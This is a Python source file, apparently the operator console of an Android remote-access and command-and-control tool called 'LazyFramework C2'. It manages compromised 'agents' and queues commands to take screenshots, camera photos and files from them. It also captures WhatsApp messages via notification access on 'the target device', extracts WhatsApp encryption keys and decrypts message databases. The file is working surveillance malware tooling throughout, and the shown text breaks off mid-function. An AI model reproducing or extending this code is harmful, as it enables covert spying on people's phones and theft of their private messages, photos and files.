#!/usr/bin/env python3
"""
LazyFramework C2 CLI - Complete Command Line Tool
All features: Agents, Commands, Results, Screenshots, Camera, Wallpaper, WhatsApp Capture & Decrypt
"""

import argparse
import sqlite3
import json
import os
import sys
import glob
import base64
import time
from datetime import datetime
from database import (
    get_agents, get_commands, get_results, 
    save_command, delete_old_results, get_stats,
    get_agent, get_connection
)
import threading

# ==================== COLORS ====================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'

def print_header(text):
    print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*70}")
    print(f"  {text}")
    print(f"{'='*70}{Colors.ENDC}\n")

def print_success(text):
    print(f"{Colors.GREEN}✅ {text}{Colors.ENDC}")

def print_error(text):
    print(f"{Colors.RED}❌ {text}{Colors.ENDC}")

def print_warning(text):
    print(f"{Colors.YELLOW}⚠️  {text}{Colors.ENDC}")

def print_info(text):
    print(f"{Colors.CYAN}ℹ️  {text}{Colors.ENDC}")

def print_bold(text):
    print(f"{Colors.BOLD}{text}{Colors.ENDC}")

def print_dim(text):
    print(f"{Colors.DIM}{text}{Colors.ENDC}")

def format_file_size(size):
    if size <= 0:
        return "0 B"
    units = ["B", "KB", "MB", "GB", "TB"]
    digit_groups = int((len(str(size)) - 1) / 3)
    return f"{size / (1024 ** digit_groups):.1f} {units[digit_groups]}"

def format_timestamp(ts):
    try:
        if isinstance(ts, str):
            dt = datetime.fromisoformat(ts)
        else:
            dt = ts
        return dt.strftime('%Y-%m-%d %H:%M:%S')
    except:
        return str(ts)

# ==================== AGENTS COMMANDS ====================

def cmd_agents_list(args):
    """List all agents"""
    print_header("📡 Connected Agents")
    
    agents = get_agents(limit=1000)
    
    if not agents:
        print_warning("No agents connected")
        return
    
    print(f"{Colors.CYAN}{'Agent ID':<22} {'Device':<22} {'Android':<12} {'Last Seen':<22}{Colors.ENDC}")
    print("-" * 80)
    
    for agent in agents:
        agent_id = agent['agent_id'][:18] + "..." if len(agent['agent_id']) > 18 else agent['agent_id']
        device = (agent['device'] or 'Unknown')[:22]
        android = (agent['android_version'] or 'Unknown')[:12]
        last_seen = format_timestamp(agent['last_seen'])
        
        print(f"{agent_id:<22} {device:<22} {android:<12} {last_seen:<22}")
    
    print(f"\n{Colors.GREEN}Total: {len(agents)} agents{Colors.ENDC}\n")

def cmd_agents_show(args):
    """Show agent details"""
    agent = get_agent(args.agent_id)
    
    if not agent:
        print_error(f"Agent {args.agent_id} not found")
        return
    
    print_header(f"📱 Agent: {args.agent_id}")
    print(f"Device:        {agent.get('device') or 'Unknown'}")
    print(f"Android:       {agent.get('android_version') or 'Unknown'}")
    print(f"Manufacturer:  {agent.get('manufacturer') or 'Unknown'}")
    print(f"Created:       {format_timestamp(agent.get('created_at'))}")
    print(f"Last Seen:     {format_timestamp(agent.get('last_seen'))}\n")
    
    # Show recent commands
    print_bold("📊 Recent Commands:")
    commands = get_commands(agent_id=args.agent_id, limit=5)
    if commands:
        for cmd in commands:
            status_color = Colors.GREEN if cmd['status'] == 'sent' else Colors.YELLOW
            print(f"  [{cmd['id']}] {cmd['command']:<25} {status_color}{cmd['status']}{Colors.ENDC} {format_timestamp(cmd['created_at'])}")
    else:
        print_dim("  No commands yet")
    print()

# ==================== COMMAND COMMANDS ====================

def cmd_command_send(args):
    """Send command to agent"""
    print_header("⚡ Send Command")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    if not args.command:
        print_error("Specify command with --command")
        return
    
    # Check if agent exists
    agent = get_agent(args.agent_id)
    if not agent:
        print_warning(f"Agent {args.agent_id} not found in database, but command will be queued")
    
    cmd_id = save_command(agent_id=args.agent_id, command=args.command, status='pending')
    print_success(f"Command sent! Command ID: {cmd_id}")
    print(f"Agent:   {args.agent_id}")
    print(f"Command: {args.command}")
    
    # Show helpful info for WhatsApp commands
    if args.command.startswith('WA_CAPTURE'):
        print()
        print_info("📌 WhatsApp Capture Commands:")
        if args.command == 'WA_CAPTURE_START':
            print("  Remember to enable Notification Access in Settings!")
        elif args.command == 'WA_CAPTURE_DUMP':
            print("  Use 'python cli.py results list -a <AGENT_ID>' to see results")
    
    if args.command.startswith('WA_') and args.command in ['WA_EXTRACT_KEY', 'WA_DECRYPT_DB']:
        print()
        print_info("🔓 WhatsApp Decrypt Commands:")
        if args.command == 'WA_EXTRACT_KEY':
            print("  If not rooted, follow the backup instructions")
            print("  Use 'python cli.py wa backup-info -a <AGENT_ID>' for details")
        elif args.command == 'WA_DECRYPT_DB':
            print("  Make sure key is extracted first")
            print("  Use 'python cli.py wa extract-key -a <AGENT_ID>' first")
    
    print()

def cmd_command_list(args):
    """List pending commands"""
    print_header("⏳ Pending Commands")
    
    commands = get_commands(status='pending', limit=50)
    
    if not commands:
        print_success("No pending commands")
        return
    
    print(f"{Colors.CYAN}{'ID':<6} {'Agent':<22} {'Command':<30} {'Created':<22}{Colors.ENDC}")
    print("-" * 80)
    
    for cmd in commands:
        agent_id = cmd['agent_id'][:18] + "..." if len(cmd['agent_id']) > 18 else cmd['agent_id']
        command = cmd['command'][:30]
        created = format_timestamp(cmd['created_at'])
        
        print(f"{cmd['id']:<6} {agent_id:<22} {command:<30} {created:<22}")
    
    print(f"\n{Colors.YELLOW}Total: {len(commands)} pending{Colors.ENDC}\n")

def cmd_command_history(args):
    """Show command history for agent"""
    print_header(f"📜 Command History for {args.agent_id}")
    
    commands = get_commands(agent_id=args.agent_id, limit=20)
    
    if not commands:
        print_warning("No commands found")
        return
    
    print(f"{Colors.CYAN}{'ID':<6} {'Command':<30} {'Status':<12} {'Created':<22}{Colors.ENDC}")
    print("-" * 70)
    
    for cmd in commands:
        status_color = Colors.GREEN if cmd['status'] == 'sent' else Colors.YELLOW
        created = format_timestamp(cmd['created_at'])
        print(f"{cmd['id']:<6} {cmd['command'][:30]:<30} {status_color}{cmd['status']:<12}{Colors.ENDC} {created:<22}")
    
    print()

# ==================== RESULTS COMMANDS ====================

def cmd_results_list(args):
    """List results from agent"""
    print_header(f"📊 Results for {args.agent_id}")
    
    limit = args.limit or 20
    results = get_results(agent_id=args.agent_id, limit=limit)
    
    if not results:
        print_warning("No results for this agent")
        return
    
    print(f"{Colors.CYAN}{'ID':<6} {'Command':<25} {'Size':<12} {'Created':<22}{Colors.ENDC}")
    print("-" * 65)
    
    for result in results:
        command = result['command'][:25]
        size = f"{result['result_size']/1024:.1f}KB" if result['result_size'] else "0KB"
        created = format_timestamp(result['created_at'])
        print(f"{result['id']:<6} {command:<25} {size:<12} {created:<22}")
    
    print(f"\n{Colors.GREEN}Total: {len(results)} results{Colors.ENDC}")
    print_dim(f"Use 'python cli.py results show <ID>' to view details\n")

def cmd_results_show(args):
    """Show specific result"""
    from database import get_connection
    
    conn = get_connection()
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM results WHERE id = ?', (args.result_id,))
    row = cursor.fetchone()
    conn.close()
    
    if not row:
        print_error(f"Result {args.result_id} not found")
        return
    
    print_header(f"📄 Result: {args.result_id}")
    print(f"Agent:   {row['agent_id']}")
    print(f"Command: {row['command']}")
    print(f"Size:    {row['result_size']} bytes ({format_file_size(row['result_size'] or 0)})")
    print(f"Created: {format_timestamp(row['created_at'])}\n")
    
    print_bold("📝 Content:")
    print("-" * 60)
    
    try:
        data = json.loads(row['result'])
        # Pretty print JSON
        print(json.dumps(data, indent=2))
    except:
        # Print as raw text
        content = row['result']
        # Truncate if too long
        if len(content) > 5000:
            print(content[:5000] + f"\n\n... (truncated, {len(content)} total characters)")
            print_dim(f"Use 'python cli.py results export {args.result_id}' to export full result")
        else:
            print(content)
    
    print()

def cmd_results_export(args):
    """Export result to file"""
    from database import get_connection
    
    conn = get_connection()
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM results WHERE id = ?', (args.result_id,))
    row = cursor.fetchone()
    conn.close()
    
    if not row:
        print_error(f"Result {args.result_id} not found")
        return
    
    filename = args.output or f"result_{args.result_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    try:
        data = json.loads(row['result'])
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        with open(filename, 'w') as f:
            f.write(row['result'])
    
    print_success(f"Result exported to: {filename}")
    print(f"Size: {format_file_size(os.path.getsize(filename))}\n")

# ==================== SCREENSHOT COMMANDS ====================

def cmd_screenshot_take(args):
    """Take screenshot from agent"""
    print_header("🖼️ Screenshot")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    agent = get_agent(args.agent_id)
    if not agent:
        print_warning(f"Agent {args.agent_id} not found, but command will be queued")
    
    cmd_id = save_command(agent_id=args.agent_id, command='SCREENSHOT', status='pending')
    print_success(f"Screenshot command sent! Command ID: {cmd_id}")
    print(f"Agent: {args.agent_id}")
    print_dim("Check results or screenshots folder for output\n")

def cmd_screenshot_list(args):
    """List screenshots from agent"""
    print_header(f"🖼️ Screenshots for {args.agent_id}")
    
    screenshot_dir = 'screenshots'
    if not os.path.exists(screenshot_dir):
        print_warning("No screenshots directory")
        return
    
    pattern = f"{screenshot_dir}/{args.agent_id}_screenshot_*.jpg"
    files = glob.glob(pattern)
    
    if not files:
        print_warning(f"No screenshots for agent {args.agent_id}")
        return
    
    print(f"{Colors.CYAN}{'Filename':<45} {'Size':<12} {'Modified':<22}{Colors.ENDC}")
    print("-" * 80)
    
    total_size = 0
    for f in sorted(files, reverse=True):
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        total_size += size
        modified = datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M:%S')
        size_str = format_file_size(size)
        
        print(f"{filename:<45} {size_str:<12} {modified:<22}")
    
    print(f"\n{Colors.GREEN}Total: {len(files)} screenshots ({format_file_size(total_size)}){Colors.ENDC}\n")

def cmd_screenshot_get(args):
    """Get specific screenshot"""
    screenshot_dir = 'screenshots'
    if not os.path.exists(screenshot_dir):
        print_error("No screenshots directory")
        return
    
    pattern = f"{screenshot_dir}/{args.agent_id}_screenshot_*.jpg"
    files = glob.glob(pattern)
    
    if not files:
        print_error(f"No screenshots for agent {args.agent_id}")
        return
    
    # If index specified, get that specific file
    if args.index is not None:
        if args.index < 0 or args.index >= len(files):
            print_error(f"Index out of range (0-{len(files)-1})")
            return
        files = [sorted(files, reverse=True)[args.index]]
    
    for f in files:
        filename = os.path.basename(f)
        output = args.output or filename
        import shutil
        shutil.copy2(f, output)
        print_success(f"Screenshot saved: {output}")
        print(f"Size: {format_file_size(os.path.getsize(output))}")

# ==================== CAMERA COMMANDS ====================

def cmd_camera_snapshot(args):
    """Take camera snapshot from agent"""
    print_header("📷 Camera Snapshot")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    cmd_id = save_command(agent_id=args.agent_id, command='CAMERA_SNAPSHOT', status='pending')
    print_success(f"Camera snapshot command sent! Command ID: {cmd_id}")
    print(f"Agent: {args.agent_id}")
    print_dim("Check results or photos folder for output\n")

def cmd_camera_list(args):
    """List photos from agent"""
    print_header(f"📷 Photos for {args.agent_id}")
    
    photo_dir = 'photos'
    if not os.path.exists(photo_dir):
        print_warning("No photos directory")
        return
    
    pattern = f"{photo_dir}/{args.agent_id}_snapshot_*.jpg"
    files = glob.glob(pattern)
    
    if not files:
        print_warning(f"No photos for agent {args.agent_id}")
        return
    
    print(f"{Colors.CYAN}{'Filename':<45} {'Size':<12} {'Modified':<22}{Colors.ENDC}")
    print("-" * 80)
    
    total_size = 0
    for f in sorted(files, reverse=True):
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        total_size += size
        modified = datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M:%S')
        size_str = format_file_size(size)
        
        print(f"{filename:<45} {size_str:<12} {modified:<22}")
    
    print(f"\n{Colors.GREEN}Total: {len(files)} photos ({format_file_size(total_size)}){Colors.ENDC}\n")

# ==================== WALLPAPER COMMANDS ====================

def cmd_wallpaper_set(args):
    """Set wallpaper from URL or file"""
    print_header("🖼️ Set Wallpaper")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    if not args.image:
        print_error("Specify image URL or path with --image")
        return
    
    if os.path.exists(args.image):
        try:
            with open(args.image, 'rb') as f:
                image_data = base64.b64encode(f.read()).decode()
            command = f"SET_WALLPAPER {image_data}"
            print_info(f"📁 Using local file: {args.image} ({format_file_size(os.path.getsize(args.image))})")
        except Exception as e:
            print_error(f"Error reading file: {e}")
            return
    else:
        command = f"SET_WALLPAPER {args.image}"
        print_info(f"🌐 Using URL: {args.image}")
    
    cmd_id = save_command(agent_id=args.agent_id, command=command, status='pending')
    print_success(f"Wallpaper command sent! Command ID: {cmd_id}")
    print(f"Agent: {args.agent_id}\n")

# ==================== WHATSAPP CAPTURE COMMANDS ====================

def cmd_wa_start(args):
    """Start WhatsApp message capture"""
    print_header("💬 WhatsApp Capture - Start")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    cmd_id = save_command(agent_id=args.agent_id, command='WA_CAPTURE_START', status='pending')
    print_success(f"WhatsApp capture started! Command ID: {cmd_id}")
    print(f"Agent: {args.agent_id}")
    print()
    print_warning("⚠️  IMPORTANT:")
    print("1. On the target device, go to: Settings → Notification Access")
    print("2. Find and enable 'LazyAgent' or 'Notification Listener'")
    print("3. All WhatsApp messages will now be captured\n")

def cmd_wa_stop(args):
    """Stop WhatsApp message capture"""
    print_header("💬 WhatsApp Capture - Stop")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    cmd_id = save_command(agent_id=args.agent_id, command='WA_CAPTURE_STOP', status='pending')
    print_success(f"WhatsApp capture stopped! Command ID: {cmd_id}")
    print(f"Agent: {args.agent_id}\n")

def cmd_wa_dump(args):
    """Dump captured WhatsApp messages"""
    print_header("💬 WhatsApp Messages - Dump")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    cmd_id = save_command(agent_id=args.agent_id, command='WA_CAPTURE_DUMP', status='pending')
    print_success(f"Dump command sent! Command ID: {cmd_id}")
    print(f"Agent: {args.agent_id}")
    print_dim("Check results or WhatsApp folder for messages\n")

def cmd_wa_stats(args):
    """Get WhatsApp capture statistics"""
    print_header("💬 WhatsApp Capture - Statistics")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    cmd_id = save_command(agent_id=args.agent_id, command='WA_CAPTURE_STATS', status='pending')
    print_success(f"Stats command sent! Command ID: {cmd_id}")
    print_dim("Check results for statistics\n")

def cmd_wa_clear(args):
    """Clear captured WhatsApp messages"""
    print_header("💬 WhatsApp Capture - Clear")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    cmd_id = save_command(agent_id=args.agent_id, command='WA_CAPTURE_CLEAR', status='pending')
    print_success(f"Messages cleared! Command ID: {cmd_id}\n")

def cmd_wa_list(args):
    """List captured WhatsApp message files"""
    print_header(f"💬 WhatsApp Messages for {args.agent_id}")
    
    msg_dir = 'whatsapp_messages'
    if not os.path.exists(msg_dir):
        print_warning("No WhatsApp messages directory")
        return
    
    pattern = f"{msg_dir}/{args.agent_id}_messages_*.txt"
    files = glob.glob(pattern)
    
    if not files:
        print_warning(f"No WhatsApp messages for agent {args.agent_id}")
        return
    
    print(f"{Colors.CYAN}{'Filename':<45} {'Size':<12} {'Modified':<22}{Colors.ENDC}")
    print("-" * 80)
    
    total_size = 0
    total_lines = 0
    for f in sorted(files, reverse=True):
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        total_size += size
        modified = datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M:%S')
        size_str = format_file_size(size)
        
        # Count lines
        try:
            with open(f, 'r', encoding='utf-8') as file:
                line_count = len(file.readlines())
                total_lines += line_count
        except:
            line_count = 0
        
        print(f"{filename:<45} {size_str:<12} {modified:<22}")
    
    print(f"\n{Colors.GREEN}Total: {len(files)} files, {format_file_size(total_size)}, {total_lines} messages{Colors.ENDC}\n")

def cmd_wa_show(args):
    """Show captured WhatsApp messages content"""
    msg_dir = 'whatsapp_messages'
    if not os.path.exists(msg_dir):
        print_error("No WhatsApp messages directory")
        return
    
    pattern = f"{msg_dir}/{args.agent_id}_messages_*.txt"
    files = glob.glob(pattern)
    
    if not files:
        print_error(f"No WhatsApp messages for agent {args.agent_id}")
        return
    
    # Get latest file
    latest = max(files, key=os.path.getmtime)
    
    print_header(f"💬 WhatsApp Messages (Latest)")
    print_dim(f"File: {os.path.basename(latest)}")
    print_dim(f"Size: {format_file_size(os.path.getsize(latest))}")
    print_dim(f"Modified: {datetime.fromtimestamp(os.path.getmtime(latest)).strftime('%Y-%m-%d %H:%M:%S')}")
    print("-" * 70)
    
    try:
        with open(latest, 'r', encoding='utf-8') as f:
            content = f.read()
            # Limit if too long
            if len(content) > 10000:
                print(content[:10000])
                print(f"\n... (truncated, {len(content)} total characters)")
                print_dim("Use --output to save full content")
            else:
                print(content)
    except Exception as e:
        print_error(f"Error reading file: {e}")

# ==================== WHATSAPP DECRYPT COMMANDS ====================

def cmd_wa_backup_info(args):
    """Get WhatsApp backup information"""
    print_header("🔓 WhatsApp Backup Info")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    cmd_id = save_command(agent_id=args.agent_id, command='WA_BACKUP_INFO', status='pending')
    print_success(f"Backup info command sent! Command ID: {cmd_id}")
    print(f"Agent: {args.agent_id}")
    print_dim("Check results for detailed information\n")

def cmd_wa_extract_key(args):
    """Extract WhatsApp encryption key"""
    print_header("🔑 Extract WhatsApp Key")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    cmd_id = save_command(agent_id=args.agent_id, command='WA_EXTRACT_KEY', status='pending')
    print_success(f"Extract key command sent! Command ID: {cmd_id}")
    print(f"Agent: {args.agent_id}")
    
    print()
    print_warning("📌 Note:")
    print("  - If device is rooted, key will be extracted automatically")
    print("  - If not rooted, follow the backup instructions from WA_BACKUP_INFO\n")

def cmd_wa_decrypt_db(args):
    """Decrypt WhatsApp database"""
    print_header("🔓 Decrypt WhatsApp Database")
    
    if not args.agent_id:
        print_error("Specify agent with --agent-id")
        return
    
    cmd_id = save_command(agent_id=args.agent_id, command='WA_DECRYPT_DB', status='pending')
    print_success(f"Decrypt command sent! Command ID: {cmd_id}")
    print(f"Agent: {args.agent_id}")
    print()
    print_warning("📌 Requirements:")
    print("  1. WhatsApp key must be extracted first (WA_EXTRACT_KEY)")
    print("  2. WhatsApp database file must exist")
    print("  3. Device must have sufficient storage\n")

def cmd_wa_decrypted_list(args):
    """List decrypted WhatsApp databases"""
    print_header(f"🔓 Decrypted Databases for {args.agent_id}")
    
    decrypted_dir = 'whatsapp_decrypted'
    if not os.path.exists(decrypted_dir):
        print_warning("No decrypted databases directory")
        return
    
    pattern = f"{decrypted_dir}/{args.agent_id}_decrypted_*.db"
    files = glob.glob(pattern)
    
    if not files:
        print_warning(f"No decrypted databases for agent {args.agent_id}")
        return
    
    print(f"{Colors.CYAN}{'Filename':<45} {'Size':<12} {'Modified':<22}{Colors.ENDC}")
    print("-" * 80)
    
    total_size = 0
    for f in sorted(files, reverse=True):
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        total_size += size
        modified = datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M:%S')
        size_str = format_file_size(size)
        
        # Check if messages file exists
        messages_file = f.replace('.db', '_messages.txt')
        has_messages = os.path.exists(messages_file)
        icon = "📄" if has_messages else "🔓"
        
        print(f"{filename:<45} {size_str:<12} {modified:<22}")
        if has_messages:
            msg_size = format_file_size(os.path.getsize(messages_file))
            print_dim(f"    └─ Messages file: {os.path.basename(messages_file)} ({msg_size})")
    
    print(f"\n{Colors.GREEN}Total: {len(files)} databases ({format_file_size(total_size)}){Colors.ENDC}\n")

def cmd_wa_decrypted_get(args):
    """Get decrypted WhatsApp database"""
    decrypted_dir = 'whatsapp_decrypted'
    if not os.path.exists(decrypted_dir):
        print_error("No decrypted databases directory")
        return
    
    pattern = f"{decrypted_dir}/{args.agent_id}_decrypted_*.db"
    files = glob.glob(pattern)
    
    if not files:
        print_error(f"No decrypted databases for agent {args.agent_id}")
        return
    
    # If index specified, get that specific file
    if args.index is not None:
        if args.index < 0 or args.index >= len(files):
            print_error(f"Index out of range (0-{len(files)-1})")
            return
        files = [sorted(files, reverse=True)[args.index]]
    
    for f in files:
        filename = os.path.basename(f)
        output = args.output or filename
        import shutil
        shutil.copy2(f, output)
        print_success(f"Database saved: {output} ({format_file_size(os.path.getsize(output))})")
        
        # Also copy messages file if exists
        messages_file = f.replace('.db', '_messages.txt')
        if os.path.exists(messages_file):
            msg_output = output.replace('.db', '_messages.txt')
            shutil.copy2(messages_file, msg_output)
            print_success(f"Messages saved: {msg_output}")

# ==================== WHATSAPP INFO COMMANDS ====================

def cmd_wa_info_list(args):
    """List WhatsApp info files"""
    print_header(f"📋 WhatsApp Info for {args.agent_id}")
    
    info_dir = 'whatsapp_info'
    if not os.path.exists(info_dir):
        print_warning("No WhatsApp info directory")
        return
    
    pattern = f"{info_dir}/{args.agent_id}_info_*.json"
    files = glob.glob(pattern)
    
    if not files:
        print_warning(f"No WhatsApp info for agent {args.agent_id}")
        return
    
    print(f"{Colors.CYAN}{'Filename':<45} {'Size':<12} {'Modified':<22}{Colors.ENDC}")
    print("-" * 80)
    
    for f in sorted(files, reverse=True):
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        modified = datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M:%S')
        size_str = format_file_size(size)
        print(f"{filename:<45} {size_str:<12} {modified:<22}")
    
    print()

def cmd_wa_info_show(args):
    """Show WhatsApp info content"""
    info_dir = 'whatsapp_info'
    if not os.path.exists(info_dir):
        print_error("No WhatsApp info directory")
        return
    
    pattern = f"{info_dir}/{args.agent_id}_info_*.json"
    files = glob.glob(pattern)
    
    if not files:
        print_error(f"No WhatsApp info for agent {args.agent_id}")
        return
    
    latest = max(files, key=os.path.getmtime)
    
    print_header(f"📋 WhatsApp Info for {args.agent_id}")
    
    try:
        with open(latest, 'r') as f:
            data = json.load(f)
            print(json.dumps(data, indent=2))
    except Exception as e:
        print_error(f"Error reading file: {e}")

# ==================== DATABASE COMMANDS ====================

def cmd_db_stats(args):
    """Show database statistics"""
    print_header("📊 C2 Server Statistics")
    
    stats = get_stats()
    
    # Count files in directories
    file_counts = {}
    for folder in ['photos', 'screenshots', 'downloads', 'whatsapp_messages', 'whatsapp_decrypted', 'whatsapp_info']:
        count = 0
        size = 0
        if os.path.exists(folder):
            for root, dirs, files in os.walk(folder):
                count += len(files)
                for f in files:
                    size += os.path.getsize(os.path.join(root, f))
        file_counts[folder] = {'count': count, 'size': size}
    
    print(f"{Colors.BOLD}Database:{Colors.ENDC}")
    print(f"  Connected Agents:    {Colors.GREEN}{stats['agents']}{Colors.ENDC}")
    print(f"  Pending Commands:    {Colors.YELLOW}{stats['pending_commands']}{Colors.ENDC}")
    print(f"  Total Results:       {Colors.BLUE}{stats['results']}{Colors.ENDC}")
    
    print(f"\n{Colors.BOLD}Files:{Colors.ENDC}")
    for folder, info in file_counts.items():
        if info['count'] > 0:
            print(f"  {folder}:            {info['count']} files ({format_file_size(info['size'])})")
    
    total_size = sum([info['size'] for info in file_counts.values()])
    print(f"\n{Colors.BOLD}Total Storage: {Colors.GREEN}{format_file_size(total_size)}{Colors.ENDC}\n")

def cmd_db_cleanup(args):
    """Cleanup old data"""
    print_header("🧹 Database Cleanup")
    
    days = args.days or 30
    
    print_info(f"Deleting results older than {days} days...")
    delete_old_results(days=days)
    
    # Clean old files
    deleted_files = 0
    deleted_size = 0
    for folder in ['photos', 'screenshots', 'downloads', 'whatsapp_messages', 'whatsapp_decrypted', 'whatsapp_info']:
        if os.path.exists(folder):
            now = datetime.now()
            for root, dirs, files in os.walk(folder):
                for f in files:
                    filepath = os.path.join(root, f)
                    mtime = datetime.fromtimestamp(os.path.getmtime(filepath))
                    if (now - mtime).days > days:
                        try:
                            deleted_size += os.path.getsize(filepath)
                            os.remove(filepath)
                            deleted_files += 1
                        except:
                            pass
    
    print_success(f"Cleanup completed!")
    print(f"  Deleted: {deleted_files} files ({format_file_size(deleted_size)})\n")

def cmd_db_export(args):
    """Export data to JSON"""
    print_header("📤 Export Data")
    
    data = {
        'agents': get_agents(limit=10000),
        'results': get_results(limit=10000),
        'exported_at': datetime.now().isoformat()
    }
    
    filename = args.output or f"c2_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2, default=str)
    
    print_success(f"Exported to {filename}")
    print(f"  Agents: {len(data['agents'])}")
    print(f"  Results: {len(data['results'])}")
    print(f"  Size: {format_file_size(os.path.getsize(filename))}\n")

# ==================== DOWNLOAD COMMANDS ====================

def cmd_download_list(args):
    """List downloaded files"""
    print_header(f"💾 Downloads for {args.agent_id}")
    
    download_dir = 'downloads'
    if not os.path.exists(download_dir):
        print_warning("No downloads directory")
        return
    
    pattern = f"{download_dir}/{args.agent_id}_*"
    files = glob.glob(pattern)
    
    if not files:
        print_warning(f"No downloads for agent {args.agent_id}")
        return
    
    print(f"{Colors.CYAN}{'Filename':<45} {'Size':<12} {'Modified':<22}{Colors.ENDC}")
    print("-" * 80)
    
    total_size = 0
    for f in sorted(files, reverse=True):
        filename = os.path.basename(f)
        # Remove agent_id prefix for display
        display_name = filename.replace(f"{args.agent_id}_", "")
        size = os.path.getsize(f)
        total_size += size
        modified = datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M:%S')
        size_str = format_file_size(size)
        
        print(f"{display_name[:45]:<45} {size_str:<12} {modified:<22}")
    
    print(f"\n{Colors.GREEN}Total: {len(files)} files ({format_file_size(total_size)}){Colors.ENDC}\n")

def cmd_download_get(args):
    """Get downloaded file"""
    download_dir = 'downloads'
    if not os.path.exists(download_dir):
        print_error("No downloads directory")
        return
    
    pattern = f"{download_dir}/{args.agent_id}_*{args.filename}*"
    files = glob.glob(pattern)
    
    if not files:
        # Try exact match
        exact = os.path.join(download_dir, f"{args.agent_id}_{args.filename}")
        if os.path.exists(exact):
            files = [exact]
        else:
            print_error(f"No file found: {args.filename}")
            return
    
    for f in files:
        output = args.output or os.path.basename(f).replace(f"{args.agent_id}_", "")
        import shutil
        shutil.copy2(f, output)
        print_success(f"File saved: {output} ({format_file_size(os.path.getsize(output))})")

# ==================== INTERACTIVE MODE ====================

def interactive_mode():
    """Interactive CLI mode"""
    print_header("🎯 LazyFramework C2 - Interactive Mode")
    print("Type 'help' for commands, 'exit' to quit\n")
    
    commands = {
        'agents': 'List all agents',
        'agents show <id>': 'Show agent details',
        'command send <id> <cmd>': 'Send command to agent',
        'command list': 'List pending commands',
        'results <id>': 'List results for agent',
        'results show <id>': 'Show result details',
        'screenshot take <id>': 'Take screenshot',
        'screenshot list <id>': 'List screenshots',
        'camera snapshot <id>': 'Take camera photo',
        'camera list <id>': 'List photos',
        'wallpaper set <id> <image>': 'Set wallpaper',
        'wa start <id>': 'Start WhatsApp capture',
        'wa stop <id>': 'Stop WhatsApp capture',
        'wa dump <id>': 'Dump WhatsApp messages',
        'wa list <id>': 'List captured messages',
        'wa decrypt <id>': 'Decrypt WhatsApp database',
        'stats': 'Show statistics',
        'cleanup': 'Cleanup old data',
        'help': 'Show this help',
        'exit': 'Exit interactive mode'
    }
    
    while True:
        try:
            cmd = input(f"{Colors.BOLD}{Colors.GREEN}lazy> {Colors.ENDC}").strip()
            
            if not cmd:
                continue
            
            if cmd == 'exit':
                print_success("Goodbye!")
                break
            
            if cmd == 'help':
                print("\nAvailable Commands:")
                for k, v in commands.items():
                    print(f"  {Colors.CYAN}{k:<30}{Colors.ENDC} {v}")
                print()
                continue
            
            # Parse command
            parts = cmd.split()
            if not parts:
                continue
            
            # Convert to CLI arguments
            args_list = []
            if parts[0] == 'agents':
                if len(parts) > 1 and parts[1] == 'show':
                    args_list = ['agents', 'show', parts[2]]
                else:
                    args_list = ['agents', 'list']
            elif parts[0] == 'command':
                if len(parts) > 1 and parts[1] == 'send':
                    args_list = ['command', 'send', '-a', parts[2], '-c', ' '.join(parts[3:])]
                elif len(parts) > 1 and parts[1] == 'list':
                    args_list = ['command', 'list']
                else:
                    print_error("Usage: command send <agent_id> <command>")
                    continue
            elif parts[0] == 'results':
                if len(parts) > 1 and parts[1] == 'show':
                    args_list = ['results', 'show', parts[2]]
                elif len(parts) > 1:
                    args_list = ['results', 'list', '-a', parts[1]]
                else:
                    print_error("Usage: results <agent_id>")
                    continue
            elif parts[0] == 'screenshot':
                if len(parts) > 1:
                    if parts[1] == 'take':
                        args_list = ['screenshot', 'take', '-a', parts[2]]
                    elif parts[1] == 'list':
                        args_list = ['screenshot', 'list', '-a', parts[2]]
                    else:
                        args_list = ['screenshot', 'take', '-a', parts[1]]
                else:
                    print_error("Usage: screenshot <take|list> <agent_id>")
                    continue
            elif parts[0] == 'camera':
                if len(parts) > 1:
                    if parts[1] == 'snapshot':
                        args_list = ['camera', 'snapshot', '-a', parts[2]]
                    elif parts[1] == 'list':
                        args_list = ['camera', 'list', '-a', parts[2]]
                    else:
                        args_list = ['camera', 'snapshot', '-a', parts[1]]
                else:
                    print_error("Usage: camera <snapshot|list> <agent_id>")
                    continue
            elif parts[0] == 'wallpaper':
                if len(parts) > 1 and parts[1] == 'set':
                    args_list = ['wallpaper', 'set', '-a', parts[2], '-i', parts[3]]
                else:
